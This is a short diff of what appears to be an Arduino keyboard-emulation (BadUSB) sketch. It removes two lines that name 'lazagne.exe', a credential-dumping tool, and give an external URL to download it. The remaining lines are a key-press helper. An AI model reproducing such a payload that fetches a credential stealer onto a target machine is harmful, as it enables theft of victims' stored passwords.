@@ -2,9 +2,6 @@
 
 #define defaultDelay 5
 
-String filename = "lazagne.exe";
-String fileurl = "https://s3.nofilecdn.io/g/uDVgXgogfrlwS8TKj0P65PHHan3bbXqg2GhXXaAOuwWGK3CA2o5J5XrdmH9tcsjq/laZagne.exe";
-
 void typeKey(int key){
   Keyboard.press(key);
   delay(defaultDelay);
